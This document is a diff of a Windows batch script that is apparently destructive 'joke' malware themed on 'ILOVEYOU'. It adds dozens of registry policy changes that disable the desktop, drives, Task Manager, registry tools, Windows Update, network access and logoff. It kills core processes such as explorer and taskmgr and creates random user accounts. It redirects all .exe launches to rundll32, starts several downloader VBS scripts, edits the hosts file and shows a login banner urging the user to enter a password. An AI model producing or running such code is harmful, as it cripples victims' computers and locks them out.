+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoPinningToTaskbar /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v TaskbarNoPinnedList /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSaveSettings /t REG_DWORD /d 1 /f
+reg ADD "HKCU\Software\Microsoft\Command Processor" /v DisableUNCCheck /t REG_DWORD /d 1 /f
+reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWinkeys /t REG_DWORD /d 1 /f
+reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogoff /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFileAssociate /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoTrayItemsDisplay /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoTrayContextMenu /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Hidden /t REG_DWORD /d 2 /f
+reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangePassword /t REG_DWORD /d 1 /f
+reg ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f
+reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f
+reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideClock /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideClock /t REG_DWORD /d 1 /f
+reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyGames /t REG_DWORD /d 1 /f
+reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyMusic /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /t REG_DWORD /d 67108863 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoUserNameInStartMenu /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v StartMenuLogOff /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuSubFolders /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoCommonGroups /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFavoritesMenu /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRecentDocsMenu /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSetFolders /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoAddPrinter /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFind /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSMHelp /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoChangeStartMenu /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSMMyDocs /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSMMyPictures /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyDocuments /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyDownloads /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Policies\Microsoft\Windows\Personalization" /v NoLockScreen /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Policies\Microsoft\WindowsStore" /v RemoveWindowsStore /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Policies\Microsoft\WindowsStore" /v DisableStoreApps /t REG_DWORD /d 1 /f
+reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCAVolume /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCAVolume /t REG_DWORD /d 1 /f
+reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCANetwork /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCANetwork /t REG_DWORD /d 1 /f
+reg ADD "HKCU\Software\Policies\Microsoft\Windows\Explorer" /v DisableNotificationCenter /t REG_DWORD /d 1 /f
+reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCAPower /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCAPower /t REG_DWORD /d 1 /f
+reg ADD "HKCU\Software\Policies\Microsoft\MMC" /v RestrictToPermittedSnapins /t REG_DWORD /d 1 /f
+reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v HideFastUserSwitching /t REG_DWORD /d 1 /f
+reg ADD "HKCU\Software\Microsoft\Windows" /v SearchboxTaskbarMode /t REG_DWORD /d 0 /f
+reg ADD "HKCU\Software\Microsoft\Windows\DWM" /v EnableAeroPeek /t REG_DWORD /d 0 /f
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v ColorPrevalence /d 2 /f
+reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWindowsUpdate /t REG_DWORD /d 1 /f
+reg ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v NoConnectedUser /t REG_DWORD /d 3 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDesktop /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v legalnoticecaption /t REG_SZ /d GET_READY_TO_BE_KISSED! /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v legalnoticetext /t REG_SZ /d I_ALWAYS_LOVE_YOU!!!_PRESS_OK_AND_ENTER_YOUR_PASSWORD_TO_BE_KISSED_MY_FRIEND!!!_ILOVEYOU!!!_SOS!!!1 /f
+reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Search\Flighting\1\SearchBoxText" /v Value /t REG_SZ /d SAY_GOODBYE_TO_YOUR_COMPUTER! /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Personalization" /v LockScreenImage /t REG_SZ /d C:\WINDOWS\HappyPong\scp_173.png /f
 goto WeAreWelcoming
 
 :WeAreWelcoming
+taskkill /f /im ms-settings:.exe /im snippingtool.exe /im taskmgr.exe /im msconfig.exe /im powershell.exe /im wmplayer.exe /im notepad.exe /im calc.exe /im write.exe /im mspaint.exe /im cortana.exe /im control.exe /im ms-windows-store:.exe /im regedit.exe /im iexpress.exe /im winver.exe /im explorer.exe
 net user LOVEYOU%random% %random% /add
 net user LOVEYOU%random% %random% /add
 net user LOVEYOU%random% %random% /add
@@ -543,6 +525,16 @@ goto GoBackToThePast
 :GoBackToThePast
 cd C:\WINDOWS\HappyPong
 date 6/6/2006
+start change.vbs
+start explorer.exe
+start note.txt
+start ieandstuff.vbs
+start download1.vbs
+start download2.vbs
+start download3.vbs
+start download4.vbs
+start pong.vbs
+start shutdown.vbs
 start username.bat
 ping -n 5 127.0.0.1>nul
 start enterkey.vbs
@@ -554,6 +546,18 @@ goto HahaNoChangeBackground
 
 :HahaNoChangeBackground
 reg ADD "HKCR\exefile\shell\open\command" /v /t REG_SZ /d rundll32.exe /f
-reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
 ping -n 25 127.0.0.1>nul
 start music.vbs
+goto NoMoreInternet
+
+:NoMoreInternet
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoNetworkConnections /t REG_DWORD /d 1 /f 
+reg ADD "HKLM\Software\Policies\Microsoft\MicrosoftEdge\Main" /v AllowPreLaunch /t REG_DWORD /d 0 /f
+reg ADD "HKLM\SYSTEM\CurrentControlSet\Services\NlaSvc\Parameters\Internet" /v EnableActiveProbing /t REG_DWORD /d 0 /f
+reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuNetworkPlaces /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Policies\Microsoft\Windows\System" /v DontDisplayNetworkSelectionUI /t REG_DWORD /d 1 /f
+reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
+goto BlockDeviantArt
+
+:BlockDeviantArt
+echo 127.0.0.1 https://www.deviantart.com >> C:\WINDOWS\System32\drivers\etc\hosts
